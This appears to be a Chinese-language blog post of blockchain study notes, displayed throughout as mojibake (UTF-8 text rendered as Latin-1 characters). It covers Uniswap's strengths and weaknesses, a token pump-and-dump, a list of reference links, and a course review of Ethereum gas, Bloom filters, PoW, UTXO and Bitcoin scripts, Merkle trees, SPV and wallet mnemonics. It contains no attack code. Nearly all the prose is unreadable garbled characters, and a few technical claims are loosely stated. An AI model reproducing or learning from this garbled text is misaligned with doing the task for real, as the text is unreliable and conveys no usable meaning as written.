<p>å®Œå…¨å»ä¸­å¿ƒåŒ–ï¼Œä¸ä¾èµ–ç¬¬ä¸‰æ–¹ï¼Œä»»ä½•äººéƒ½å¯ä»¥åŸºäºuniswapæ„å»ºè‡ªå·±çš„åº”ç”¨<br>å¯ä»¥è‡ªç”±åœ°åˆ›å»ºä»»ä½•ERC20äº¤æ˜“å¯¹<br>ä¸å…¶ä»–å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ç›¸æ¯”gasè´¹ç”¨æ›´ä½<br>ä»»ä½•äººéƒ½å¯ä»¥å‘uniswapæµåŠ¨æ± ä¸­æä¾›æµåŠ¨æ€§ï¼Œäººäººéƒ½å¯ä»¥æ˜¯åšå¸‚å•†</p>
<p>ç¼ºç‚¹</p>
<p>éœ€è¦ä¾èµ–å¥—åˆ©è€…å»å¹³è¡¡uniswapä¸å¤–éƒ¨äº¤æ˜“æ‰€ä¹‹é—´çš„æ±‡ç‡<br>å¯¹å¤§æˆ·ä¸å‹å¥½ï¼Œè¿›è¡Œå¤§é¢çš„äº¤æ˜“ä¼šé€ æˆå¾ˆå¤§çš„æ»‘ç‚¹ </p>
<hr>
<p>äº†è§£Uniswapçš„åŸç†ä¹‹åï¼Œå†æ¥çœ‹ä¸€ä¸‹ç–¯ç‹‚çš„å¸åœˆã€‚</p>
<p>Uniswapçš„æ’å®šä¹˜ç§¯æœºåˆ¶å†³å®šäº†ï¼Œå“ªä¸€è¾¹çš„ä¹°å…¥æ•°é‡å¤šï¼Œä»·æ ¼å°±ä¼šä¸Šå‡ï¼ŒåŒæ—¶å¦‚æœä¹°å…¥çš„è¶Šæ™šï¼Œä¸Šæ¶¨çš„å¹…åº¦åˆ™è¶Šå¿«ã€‚æ‰€ä»¥ï¼Œä¸€æ—¦ä¸€ä¸ªUniswapçš„ä»£å¸è¿›å…¥äº†å¤§å¤šæ•°äººçš„è§†é‡ï¼Œä¸æ–­ä¸Šæ¶¨çš„å¸ä»·è®©è¿½æ¶¨æ€è·Œçš„éŸ­èœä»¬äº‰å…ˆæåçš„ä¹°å…¥ï¼Œä»è€Œè¿›ä¸€æ­¥æ¨åŠ¨ä»·æ ¼ä¸Šæ¶¨ï¼Œç›´åˆ°æ²¡æœ‰äººå†ä¹°äº†ï¼Œå°±å¼€å¯åŒæ ·çš„å¿«é€Ÿä¸‹è·Œè¿‡ç¨‹ã€‚CoinGeckoæ•°æ®æ˜¾ç¤ºï¼Œä»5æœˆ30æ—¥åˆ°6æœˆ5æ—¥ï¼ŒSTAå¸ä»·ä»å‡ ä¹ä¸ºç©ºæ°”ä»·çš„0.00001å…ƒä¸€è·¯æ¶¨è‡³çº¦1å…ƒï¼Œä¸Šæ¶¨çº¦10ä¸‡å€ã€‚ç„¶ååˆå¿«é€Ÿä¸‹è·Œã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233132.jpg" alt="img"></p>
<p><a href="https://link.zhihu.com/?target=https://www.chainnode.com/post/466619">https://www.chainnode.com/post/466619www.chainnode.com</a><a href="https://link.zhihu.com/?target=https://www.qklw.com/top/20200710/100667.html">Uniswapä¸Šåº„å®¶çš„æ”¶å‰²å¥—è·¯ - åŒºå—é“¾ç½‘www.qklw.com<img src="https://pic3.zhimg.com/v2-64e626cb3c3ecd6faa0c616a08cddc62_ipico.jpg" alt="å›¾æ ‡"></a></p>
<p>å‚è€ƒï¼š</p>
<ol>
<li><a href="https://zhuanlan.zhihu.com/p/167023364">https://zhuanlan.zhihu.com/p/167023364</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/167023364">https://zhuanlan.zhihu.com/p/167023364</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.chainnews.com/articles/611741523815.htm">https://www.chainnews.com/articles/611741523815.htm</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/79dbc73f8de4">https://www.jianshu.com/p/79dbc73f8de4</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.chainnode.com/post/466619">https://www.chainnode.com/post/466619</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.hulianmaibo.com/posts/info/13110">https://www.hulianmaibo.com/posts/info/13110</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.okex.com/academy/zh/taking-uniswap-curve-balancer-as-an-example-detailed-analysis-of-automatic-market-maker-amm-cn">https://www.okex.com/academy/zh/taking-uniswap-curve-balancer-as-an-example-detailed-analysis-of-automatic-market-maker-amm-cn</a> ã€æ„Ÿè§‰ä¸å¯¹ï¼›è€Œä¸”uniswapäº¤æ˜“æ‰€ä¹Ÿä¼šè·‘è·¯ã€‘</li>
<li><a href="https://link.zhihu.com/?target=https://medium.com/cortexlabs/defi%E7%A7%91%E6%99%AE%E7%B3%BB%E5%88%97%E4%B9%8B-%E4%B8%80-uniswap%E5%88%B0%E5%BA%95%E6%98%AF%E6%80%8E%E4%B9%88%E8%BF%90%E8%BD%AC%E7%9A%84-2a82c9afc1df">https://medium.com/cortexlabs/defi%E7%A7%91%E6%99%AE%E7%B3%BB%E5%88%97%E4%B9%8B-%E4%B8%80-uniswap%E5%88%B0%E5%BA%95%E6%98%AF%E6%80%8E%E4%B9%88%E8%BF%90%E8%BD%AC%E7%9A%84-2a82c9afc1df</a></li>
<li><a href="https://link.zhihu.com/?target=http://jizhid.com/number/blockchain/45304.html">http://jizhid.com/number/blockchain/45304.html</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.cailu.net/article/13113111130466711.html">https://www.cailu.net/article/13113111130466711.html</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.cnblogs.com/zdz8207/p/qkl-Uniswap.html">https://www.cnblogs.com/zdz8207/p/qkl-Uniswap.html</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.chainnode.com/post/466619">https://www.chainnode.com/post/466619</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.8btc.com/media/621174">https://www.8btc.com/media/621174</a></li>
<li><a href="https://link.zhihu.com/?target=https://learnblockchain.cn/2018/01/12/create_token/">https://learnblockchain.cn/2018/01/12/create_token&#x2F;</a> ä»¥å¤ªåŠä»£å¸</li>
</ol>
<h1 id="åŒºå—é“¾æŠ€æœ¯å¤ä¹ "><a href="#åŒºå—é“¾æŠ€æœ¯å¤ä¹ " class="headerlink" title="åŒºå—é“¾æŠ€æœ¯å¤ä¹ "></a>åŒºå—é“¾æŠ€æœ¯å¤ä¹ </h1><h2 id="gasçš„ç›®çš„"><a href="#gasçš„ç›®çš„" class="headerlink" title="gasçš„ç›®çš„"></a>gasçš„ç›®çš„</h2><p>ä»¥å¤ªåŠä¸­å®ç°çš„è„šæœ¬è¯­è¨€æ˜¯å›¾çµå®Œå¤‡çš„,gasçš„å¼•å…¥å¯ä»¥é˜²æ­¢ç”¨æˆ·åœ¨è„šæœ¬ä¸­å†™æ­»å¾ªç¯æ¥å‘çŸ¿å·¥.</p>
<p>gasçš„ç›®çš„æ˜¯é™åˆ¶æ‰§è¡Œäº¤æ˜“æ‰€éœ€çš„å·¥ä½œé‡ï¼ŒåŒæ—¶ä¸ºæ‰§è¡Œæ”¯ä»˜è´¹ç”¨ã€‚gas ç”¨æ¥è¡¡é‡ä½ çš„è¿™ç¬”äº¤æ˜“ï¼ˆæˆ–è€…åˆçº¦ä»£ç è°ƒç”¨ï¼‰æ‰€æ¶ˆè€—çš„èµ„æºï¼ˆåŒ…æ‹¬è®¡ç®—é‡ï¼Œå­˜å‚¨ï¼Œå¸¦å®½ç­‰ï¼‰ã€‚é™¤äº†è®¡ç®—äº¤æ˜“çš„è´¹ç”¨å¤–,äº¤æ˜“æˆ–è€…åˆçº¦ä¸Šä¼ ä¹Ÿéœ€è¦è´¹ç”¨.ä¸€ç¬”äº¤æ˜“æ‰€äº§ç”Ÿçš„è½¬è´¦è´¹ç”¨ä¼šå¥–åŠ±ç»™æ‰“åŒ…åŒ…å«è¿™ç¬”äº¤æ˜“çš„åŒºå—çš„çŸ¿å·¥ã€‚åŒºå—ä¸æ˜¯å“ªä¸ªçŸ¿å·¥äº§ç”Ÿçš„ï¼Œæ‰€æœ‰çš„çŸ¿å·¥éƒ½ä¼šç«äº‰ä¸‹ä¸€ä¸ªåŒºå—çš„æ‰“åŒ…æƒï¼Œèƒœå‡ºè€…å¯ä»¥æ‰“åŒ…ä¸‹ä¸€ä¸ªåŒºå—ã€‚äº¤æ˜“ä¸ä¸€å®šä¼šå­˜åœ¨ä¸€ä¸ªåŒºå—ï¼Œå®ƒäº¤æ˜“è¢«å¹¿æ’­å‡ºå»åï¼Œåœ¨æ•°ç§’å†…å…¨ç½‘æ‰€æœ‰çš„èŠ‚ç‚¹éƒ½ä¼šæ¥æ”¶åˆ°è¿™ç¬”äº¤æ˜“ã€‚çŸ¿å·¥ä¼šä¼˜å…ˆæ‰“åŒ… gas åˆç†ï¼Œgas price é«˜çš„äº¤æ˜“ã€‚å¦‚æœç”¨æˆ·äº¤æ˜“æ—¶æ‰€æ”¯ä»˜çš„çŸ¿å·¥è´¹éå¸¸ä½(out of gas), é‚£ä¹ˆè¿™ç¬”äº¤æ˜“å¯èƒ½ä¸ä¼šè¢«çŸ¿å·¥æ‰“åŒ…, ä»è€Œé€ æˆäº¤æ˜“å¤±è´¥ã€‚äº¤æ˜“è¿è¡Œå®Œæ¯•,å¦‚æœæœ‰å‰©ä½™,å†é€€è¿˜ç»™ç”¨æˆ·,å¦‚æœä¸å¤Ÿ,çŸ¿å·¥ä¹Ÿä¸è¿˜é’±,åªæ˜¯æŠŠäº¤æ˜“å…¨éƒ¨å›æ»š</p>
<p>å¦‚æœè¯¥äº¤æ˜“éœ€è¦ä½¿ç”¨çš„gasæ•°é‡å°äºæˆ–ç­‰äºæ‰€è®¾ç½®çš„gas limitï¼Œé‚£ä¹ˆè¿™ä¸ªäº¤æ˜“ä¼šè¢«æˆåŠŸå¤„ç†ã€‚å¦‚æœgasæ€»æ¶ˆè€—è¶…è¿‡gas limitï¼Œé‚£ä¹ˆæ‰€æœ‰çš„æ“ä½œéƒ½ä¼šè¢«å¤åŸï¼ˆå›æ»šï¼‰ï¼Œä½†æ˜¯äº¤æ˜“è´¹ä»ç„¶ä¼šè¢«çŸ¿å·¥æ”¶å–ã€‚åŒºå—é“¾ä¼šæ˜¾ç¤ºè¿™ç¬”äº¤æ˜“å®Œæˆå°è¯•ï¼Œä½†å› ä¸ºæ²¡æœ‰æä¾›è¶³å¤Ÿçš„gaså¯¼è‡´æ‰€æœ‰çš„åˆçº¦å‘½ä»¤éƒ½è¢«å¤åŸã€‚</p>
<p>ä¸ºäº†å…‹æœæ‹’ç»æœåŠ¡å’Œæ— é™å¾ªç¯ï¼Œä½¿ç”¨0.00001ä»¥å¤ªå¸æˆ–1 Gasç”¨äºæ‰§è¡Œä¸€è¡Œä»£ç ã€‚å¦‚æœæ²¡æœ‰è¶³å¤Ÿçš„ä»¥å¤ªå¸ï¼Œäº¤æ˜“ä¸ä¼šè¢«æ‰§è¡Œã€‚å®ƒä¹Ÿæ˜¯ä¸ºäº†ä¿ƒè¿›ä»£ç è®¾è®¡è€…æé«˜æ•ˆç‡ï¼Œè€Œä¸æ˜¯æµªè´¹å¸¦å®½å’ŒCPUçš„åˆ©ç”¨ç‡ã€‚</p>
<p>ä»¥å¤ªåŠçš„äº¤æ˜“è´¹ç”¨&#x3D; gas æ•°é‡ * gas price (gas å•ä»·, ä»¥å¤ªå¸è®¡ä»·) </p>
<h4 id="ä¸ºä»€ä¹ˆéœ€è¦å¤šä¸ªhashå‡½æ•°å‘¢ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆéœ€è¦å¤šä¸ªhashå‡½æ•°å‘¢ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆéœ€è¦å¤šä¸ªhashå‡½æ•°å‘¢ï¼Ÿ"></a>ä¸ºä»€ä¹ˆéœ€è¦å¤šä¸ªhashå‡½æ•°å‘¢ï¼Ÿ</h4><p>é™ä½è¯¯åˆ¤ç‡</p>
<p>å¦‚æœå“ˆå¸Œå‡½æ•°çš„ä¸ªæ•°å¤šï¼Œé‚£ä¹ˆåœ¨å¯¹ä¸€ä¸ªä¸å±äºé›†åˆçš„å…ƒç´ è¿›è¡ŒæŸ¥è¯¢æ—¶å¾—åˆ°0çš„æ¦‚ç‡å°±å¤§ï¼›ä½†å¦ä¸€æ–¹é¢ï¼Œå¦‚æœå“ˆå¸Œå‡½æ•°çš„ä¸ªæ•°å°‘ï¼Œé‚£ä¹ˆä½æ•°ç»„ä¸­çš„0å°±å¤šã€‚</p>
<p>åŒºå—é“¾æŠ€æœ¯æä¾›äº†ä¸€ç§äº¤æ˜“è®°å½•å’Œæ‰§è¡Œçš„æ–°çš„å½¢å¼ï¼Œå…·æœ‰å»ä¸­å¿ƒåŒ–ã€ä¸å¯ç¯¡æ”¹å’ŒæŠµèµ–ç­‰ä¼˜ç§€çš„æ€§è´¨ï¼Œåœ¨é‡‘èå’Œå…¬å…±äº‹åŠ¡æ–¹é¢æœ‰ç€å·¨å¤§çš„æ½œåŠ›åº”ç”¨ã€‚ç›®å‰ä¸ºæ­¢ï¼ŒåŒºå—é“¾æœ€æˆåŠŸçš„åº”ç”¨ä»ç„¶æ˜¯æ¯”ç‰¹å¸ï¼Œå› æ­¤ï¼Œè¯¾ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¸»è¦ä»¥æ¯”ç‰¹å¸ä¸ºä¾‹å­æ¥è®²è§£åŒºå—é“¾ã€‚ä¸»è¦ä»‹ç»äº†åŒºå—é“¾ä¸­æœ€åŸºæœ¬å’Œæœ€é‡è¦çš„æ¦‚å¿µï¼šåˆ†å¸ƒå¼è®°è´¦ã€å…±è¯†æœºåˆ¶ã€åŒºå—ï¼ˆMerkleæ ‘ï¼‰ã€è„šæœ¬ç­‰ã€‚åœ¨å»¶ä¼¸ä»‹ç»åŒºå—é“¾2.0ä»¥å¤ªåŠæ—¶ï¼Œæ¶‰åŠäº†ä»¥å¤ªåŠçš„ç‰¹ç‚¹ã€ä»¥å¤ªåŠä¸Šæ™ºèƒ½åˆçº¦çš„ç¼–å†™ï¼Œä»¥åŠåŒºå—é“¾å®‰å…¨ï¼Œç‰¹åˆ«æ˜¯æ™ºèƒ½åˆçº¦çš„å®‰å…¨ã€‚æœ€åï¼Œä»‹ç»äº†ä»¥å¤ªåŠä¸Šå»ä¸­å¿ƒåŒ–ä»£å¸å…‘æ¢åè®®uniswapã€‚ã€æœ€åï¼ŒæåŠåŒºå—é“¾3.0ï¼Œè®¨è®ºäº†PoWã€PoSå’ŒDPoSçš„ç‰¹ç‚¹å’ŒåŒºåˆ«ã€‚2020å¹´æ²¡è®²ã€‘</p>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬è®¨è®ºäº†æ•°å­—è´§å¸çš„æ¦‚å¿µï¼Œé€šè¿‡å›é¡¾äººç±»å²ä¸Šè´§å¸çš„å‘å±•å†ç¨‹ï¼Œè®¨è®ºè´§å¸çš„ç‰¹ç‚¹ï¼Œå®ƒå¯ä»¥ä¸å…·æœ‰å®ä½“ã€æœ¬è´¨ç‰¹å¾æ˜¯è´¦æœ¬ä¸Šè®°å½•çš„äº¤æ˜“ã€‚ä¸ºäº†è®©é‡‘èç³»ç»Ÿå…¬å¼€ã€å…¬æ­£ã€ä¸å¯ç¯¡æ”¹ï¼Œéœ€è¦ä¸€ä¸ªåˆ†å¸ƒå¼çš„å…·æœ‰ä¸å¯ç¯¡æ”¹çš„è®°è´¦ç³»ç»Ÿã€‚</p>
<p>åœ¨è¿™æ ·çš„åˆ†å¸ƒå¼è®°è´¦ç³»ç»Ÿçš„å‘å±•è¿‡ç¨‹ä¸­ï¼Œå‡ºç°äº†å¾ˆå¤šä¼˜ç§€çš„æ€æƒ³ï¼Œä¾‹å¦‚CyberPunkæ›¾å…ˆåæå‡ºçš„ecashã€hashcashå’ŒB-moneyï¼Œæ¯”ç‰¹å¸ä¹Ÿæ˜¯åœ¨è¿™äº›å°è¯•çš„åŸºç¡€ä¸Šå‘å±•è€Œæ¥ã€‚ecashæå‡ºäº†ç›²ç­¾çš„æ¦‚å¿µï¼Œâ€œè¿™æ˜¯ç¬¬ä¸€æ¬¡æœ‰äººè®¤ä¸ºæ•°å­—æœ¬èº«æ˜¯æœ‰ä»·å€¼çš„ï¼Œè¿™ä¸ªæƒ³æ³•æ˜¯ä½ å¯ä»¥é€šè¿‡ç›²ç­¾åæ–¹æ³•æ¥è·å¾—è¿™äº›æ•°å­—ï¼Œä¸”æ²¡äººçŸ¥é“ä½ å¾—åˆ°çš„æ˜¯å“ªä¸ªæ•°å­—ï¼Œä½†ä»–ä»¬çŸ¥é“è¿™äº›æ˜¯æœ‰ä»·å€¼çš„æ•°å­—ï¼Œé“¶è¡Œä¼šå…‘ç°ä»–ä»¬çš„æ¬¾é¡¹ã€‚â€HashCashä¸­æå‡ºäº†å·¥ä½œé‡è¯æ˜çš„æ–¹æ³•ï¼Œâ€œä½¿ç”¨éƒ¨åˆ†å“ˆå¸Œçš„æƒ³æ³•æ˜¯å®ƒä»¬å¯ä»¥è¢«ä»»æ„åœ°è®¾ç½®ä¸ºæ˜‚è´µçš„è®¡ç®—æˆæœ¬ï¼Œä½†æ˜¯å¯ä»¥å¯¹å…¶ç«‹å³è¿›è¡ŒéªŒè¯â€ã€‚B-moneyä¸­æå‡ºäº†å…¬å…±è´¦ç°¿å’Œä½¿ç”¨å…¬é’¥ä½œä¸ºèº«ä»½æ ‡è¯†çš„æ–¹æ³•ï¼Œäº¤æ˜“é€šè¿‡ç½‘ç»œå‘æ‰€æœ‰èŠ‚ç‚¹è¿›è¡Œå¹¿æ’­ã€‚</p>
<p>åˆ†å¸ƒå¼çš„ã€ä¸å¯ç¯¡æ”¹ã€è€Œä¸”é˜²æ­¢åŒé‡æ”¯ä»˜çš„å…¬å…±è´¦æœ¬çš„æ€æƒ³éœ€è¦æœ‰å¼ºæœ‰åŠ›çš„æŠ€æœ¯æ”¯æ’‘ã€‚åŒºå—é“¾ä¸­ä¾èµ–äºå¯†ç å­¦çš„æŠ€æœ¯ï¼Œå“ˆå¸Œå’Œéå¯¹ç§°åŠ å¯†ã€‚</p>
<p>æ¯”ç‰¹å¸åŒºå—é“¾ä¸­ä½¿ç”¨çš„å“ˆå¸Œç®—æ³•æ˜¯SHA-256ï¼Œå®ƒæœ‰ä¸€äº›å¾ˆå¥½çš„ç‰¹æ€§ï¼Œå¦‚ç¡®å®šæ€§ã€å¿«é€Ÿè®¡ç®—ã€éšè—æ€§ã€é›ªå´©æ•ˆåº”ä»¥åŠæŠ—å†²çªã€‚å“ˆå¸Œåœ¨åŒºå—é“¾ä¸­çš„åº”ç”¨æ˜¯å·¥ä½œé‡è¯æ˜ï¼Œåœ¨åŒºå—é“¾ä¸­çš„èŠ‚ç‚¹ä¸ºäº†äº‰å–åˆ°è®°è´¦çš„æƒåˆ©ï¼Œéœ€è¦è¿›è¡Œå¤§é‡çš„å“ˆå¸Œè¿ç®—ï¼Œæ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„éšæœºæ•°ï¼Œæ‰èƒ½å½¢æˆé“¾ä¸Šçš„åŒºå—ã€‚</p>
<p>æ¯”ç‰¹å¸åŒºå—é“¾ä¸­ä½¿ç”¨çš„éå¯¹ç§°åŠ å¯†çš„ç®—æ³•æ˜¯æ¤­åœ†æ›²çº¿ã€‚å½“å‰åº”ç”¨è¾ƒå¹¿çš„éå¯¹ç§°åŠ å¯†ç®—æ³•æ˜¯RSAã€‚è¯¾ä¸Šæˆ‘ä»¬è¯¦ç»†ä»‹ç»äº†RSAä¸­å…¬ç§å¯†é’¥å¯¹ç”Ÿæˆçš„æ–¹æ³•ï¼Œä»¥åŠä½¿ç”¨RSAè¿›è¡Œèº«ä»½è®¤è¯ä»¥åŠåŠ å¯†ä¼ è¾“çš„è¿‡ç¨‹ã€‚</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬è®¨è®ºäº†æ¯”ç‰¹å¸ä¸­çš„å…±è¯†æœºåˆ¶PoWã€‚å…±è¯†æœºåˆ¶æœ¬è´¨ä¸Šå°±æ˜¯è¦ä¿è¯æ‰€æœ‰èŠ‚ç‚¹è®¤å¯çš„è´¦æœ¬æ˜¯å”¯ä¸€çš„ã€‚åšåˆ°è¿™ä¸€ç‚¹ï¼Œåœ¨ä¸­å¿ƒåŒ–çš„ç³»ç»Ÿä¸­å¾ˆå®¹æ˜“ï¼Œä½†æ˜¯åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œå¿…é¡»è¦è€ƒè™‘åˆ°å‚ä¸èŠ‚ç‚¹çš„æ•…éšœå¯èƒ½ä»¥åŠæ½œåœ¨çš„æ¶æ„æ”»å‡»è€…çš„æƒ…å†µã€‚åœ¨åŒºå—é“¾ä¸Šï¼Œæ‰€æœ‰çš„äº¤æ˜“å‘æ‰€æœ‰çš„èŠ‚ç‚¹å¹¿æ’­ï¼ŒçŸ¿å·¥æ”¶åˆ°çš„äº¤æ˜“çš„å†…å®¹å’Œé¡ºåºéƒ½å¯èƒ½ä¸åŒï¼›è€Œä¸”å‡ºå—æœ‰å¥–åŠ±çš„æƒ…å†µä¸‹ï¼Œæ‰€æœ‰çš„èŠ‚ç‚¹éƒ½ä¼šå°½é‡å‡ºå—ã€‚é‚£ä¹ˆç”±å“ªä¸ªèŠ‚ç‚¹äº§ç”ŸåŒºå—ä»¥åŠå¦‚ä½•é˜²æ­¢æ¶æ„èŠ‚ç‚¹æ”»å‡»ï¼ˆå¦‚æ‹’ç»æœåŠ¡ã€åŒé‡æ”¯ä»˜ç­‰ï¼‰ï¼ŸPoWé€šè¿‡è®©å‚ä¸èŠ‚ç‚¹è¿›è¡Œç®—åŠ›çš„ç«äº‰ï¼Œä½¿å¾—åœ¨å¤§éƒ¨åˆ†çš„èŠ‚ç‚¹æ˜¯è¯šå®èŠ‚ç‚¹çš„æƒ…å†µä¸‹ï¼ŒDoSæ”»å‡»ä»¥åŠåŒé‡æ”¯ä»˜æ”»å‡»ä¸ä¼šæˆåŠŸï¼ˆæ”¯ä»˜ç­‰å¾…6æ¬¡ç¡®è®¤ï¼‰ï¼›å³ä½¿æœ‰èŠ‚ç‚¹çœŸæ­£æŒæ¡äº†51%çš„ç®—åŠ›ï¼Œè€ƒè™‘åˆ°æ§åˆ¶ç®—åŠ›çš„å·¨å¤§æŠ•å…¥ï¼ŒèŠ‚ç‚¹ä¹Ÿä¼šä¸»åŠ¨ç»´æŒåŒºå—é“¾çš„æ­£å¸¸è¿è¡Œã€‚</p>
<p>åœ¨äº§ç”ŸåŒºå—ä¹‹åï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¦ç†è§£åŒºå—ä¸Šè®°å½•çš„å†…å®¹ã€‚åŒºå—ä¸Šçš„å†…å®¹ä¸»è¦æ˜¯ä¸€ç¬”ç¬”çš„äº¤æ˜“ã€‚ç”±äºç¼ºå°‘å¯¹å…¨å±€æ•°æ®ï¼ˆå¦‚ä½™é¢ï¼‰çš„æ”¯æŒï¼Œæ¯”ç‰¹å¸å¹¶æ²¡æœ‰é‡‡ç”¨åŸºäºè´¦æˆ·çš„æ–¹å¼æ¥è¡¨ç¤ºäº¤æ˜“ï¼Œè€Œæ˜¯ä»¥UTXOï¼ˆUnspent Transaction Outputï¼‰ï¼Œå°†ä¹‹å‰äº¤æ˜“çš„è¾“å‡ºä½œä¸ºæ–°äº¤æ˜“çš„è¾“å…¥ã€‚æˆ‘ä»¬è¯¦ç»†åœ°å¯Ÿçœ‹äº†äº¤æ˜“çš„å…·ä½“å†…å®¹ï¼Œå¹¶ä»‹ç»äº†è¾“å‡ºä½ç½®ä¸Šçš„ScriptPubKeyä»¥åŠè¾“å…¥éƒ¨åˆ†çš„ScriptSigã€‚å…ˆå‰äº¤æ˜“çš„è¾“å‡ºéœ€è¦è®¾ç½®ç›¸åº”çš„æ¡ä»¶ï¼Œä¹‹åçš„äº¤æ˜“å¿…é¡»è¦æ»¡è¶³è¿™ä¸ªæ¡ä»¶æ‰èƒ½ä½¿ç”¨è¿™ç¬”è¾“å‡ºä¸­åŒ…å«çš„é’±ã€‚æ‰€ä»¥å¦‚æœçŸ¿å·¥åœ¨æ¥æ”¶åˆ°äº¤æ˜“æ—¶ï¼Œå°†æ–°äº¤æ˜“ä¸­çš„ScriptSigå’Œå…ˆå‰äº¤æ˜“ä¸­çš„ScriptPubKeyç»“åˆèµ·æ¥ï¼Œèƒ½é¡ºåˆ©è¿è¡Œç»“æŸè¿”å›Trueï¼Œé‚£ä¹ˆè¿™ä¸ªäº¤æ˜“ä¾¿æ˜¯åˆæ³•çš„ï¼Œå¯ä»¥è¢«æ‰“åŒ…è¿›åŒºå—ã€‚åŒæ—¶ï¼Œå› ä¸ºæ‰€æœ‰çš„éªŒè¯å¿…é¡»ç”±çŸ¿å·¥å®Œæˆï¼Œä¸ºäº†é˜²æ­¢çŸ¿å·¥é™·å…¥æ­»å¾ªç¯ï¼Œæ¯”ç‰¹å¸èƒ½æ”¯æŒçš„è„šæœ¬è¯­è¨€æ˜¯å›¾çµä¸å®Œå¤‡çš„ï¼Œä»…èƒ½å¤Ÿå®Œæˆæœ‰é™çš„æ“ä½œã€‚ä¸¾ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œå¦‚æœä¹‹å‰äº¤æ˜“ä¸­ScriptPubKeyä¸­è®¾ç½®çš„æ¡ä»¶æ˜¯ 3 op_add 5 op_equalï¼Œé‚£ä¹ˆæ–°äº¤æ˜“ä¸­çš„ScriptKeyåº”è¯¥æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p>
<p>è€ƒè™‘åˆ°æ¯”ç‰¹å¸ä½¿ç”¨çš„æ˜¯åŸºäºæ ˆçš„æ“ä½œã€‚op_addæ˜¯ä¸€ä¸ªæ“ä½œæŒ‡ä»¤ï¼Œéœ€è¦æœ‰ä¸¤ä¸ªæ“ä½œæ•°ï¼Œæ‰€ä»¥scriptSigä¸­ä¸€å®šéœ€è¦ä¸€ä¸ªæ•°å­—ä½œä¸ºæ“ä½œæ•°ã€‚è€Œåé¢çš„æŒ‡ä»¤ä¹Ÿå¾ˆç®€å•ï¼Œéœ€è¦å’Œ5è¿›è¡Œæ¯”è¾ƒæ“ä½œã€‚æ‰€ä»¥ScriptSigä¸­éœ€è¦è¾“å…¥2ã€‚</p>
<p>å®é™…ä¸­å¸¸ç”¨çš„äº¤æ˜“ç±»å‹æ˜¯P2PKHã€‚ä½¿ç”¨P2PKHæ‰€éœ€è¦çš„è„šæœ¬æ˜¯è¿™æ ·çš„ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233133.jpg" alt="img"></p>
<p>é™¤äº†P2PKHä¹‹å¤–ï¼Œè¿˜æœ‰å…¶ä»–å½¢å¼çš„äº¤æ˜“ï¼Œå¦‚P2PKï¼ŒmultiSigã€P2SHç­‰ã€‚å¦å¤–ä»‹ç»äº†ä¸€ä¸ªä¾‹å­Time_Lockã€‚</p>
<p>åœ¨ä»‹ç»å®Œäº¤æ˜“ä¹‹åï¼Œæˆ‘ä»¬è®¨è®ºäº†åŒºå—çš„å¤´éƒ¨ã€‚åœ¨åŒºå—çš„å¤´éƒ¨æœ‰ä¸€ä¸ªæ•°æ®ç»“æ„ï¼ŒMerkle rootã€‚åœ¨æ¯”ç‰¹å¸ç½‘ç»œä¸­ï¼ŒMerkleæ ‘è¢«ç”¨æ¥å½’çº³ä¸€ä¸ªåŒºå—ä¸­çš„æ‰€æœ‰äº¤æ˜“ï¼ŒåŒæ—¶ç”Ÿæˆæ•´ä¸ªäº¤æ˜“é›†åˆçš„æ•°å­—æŒ‡çº¹ï¼Œä¸”æä¾›äº†ä¸€ç§æ ¡éªŒåŒºå—æ˜¯å¦å­˜åœ¨æŸäº¤æ˜“çš„é«˜æ•ˆé€”å¾„ã€‚ç”Ÿæˆä¸€æ£µå®Œæ•´çš„Merkleæ ‘éœ€è¦é€’å½’åœ°å¯¹å“ˆå¸ŒèŠ‚ç‚¹å¯¹è¿›è¡Œå“ˆå¸Œï¼Œå¹¶å°†æ–°ç”Ÿæˆçš„å“ˆå¸ŒèŠ‚ç‚¹æ’å…¥åˆ°Merkleæ ‘ä¸­ï¼Œç›´åˆ°åªå‰©ä¸€ä¸ªå“ˆå¸ŒèŠ‚ç‚¹ï¼Œè¯¥èŠ‚ç‚¹å°±æ˜¯Merkleæ ‘çš„æ ¹ã€‚è¿™é‡Œæˆ‘ä»¬éœ€è¦äº†è§£Merkleè¯æ˜å’ŒMerkleè·¯å¾„æ˜¯æ€ä¹ˆå›äº‹ã€‚</p>
<p>åœ¨ä¹‹åæˆ‘ä»¬ä»‹ç»äº†SPVå’ŒBloomè¿‡æ»¤å™¨ã€‚è¿™é‡Œè¦ç†è§£Bloomè¿‡æ»¤å™¨çš„å·¥ä½œç‰¹ç‚¹ï¼Œä¸ºä»€ä¹ˆBloomè¿‡æ»¤å™¨ä¼šé€ æˆfalse positiveè€Œä¸ä¼šé€ æˆfalse negativeï¼Ÿ</p>
<p>æ¥ä¸‹æ¥ï¼Œç»“åˆ310æ¯”ç‰¹å¸æŒ‘æˆ˜ï¼Œæˆ‘ä»¬é‡ç‚¹è®¨è®ºäº†æ¯”ç‰¹å¸é’±åŒ…ï¼Œç”¨æˆ·åº”è¯¥å¦‚ä½•ç®¡ç†æ¯”ç‰¹å¸ã€‚è¿™é‡Œæˆ‘ä»¬ä¸»è¦è®¨è®ºäº†åŠ©è®°è¯ã€‚åŠ©è®°è¯æ˜¯å¦‚ä½•ç”Ÿæˆçš„å‘¢ï¼Ÿ</p>
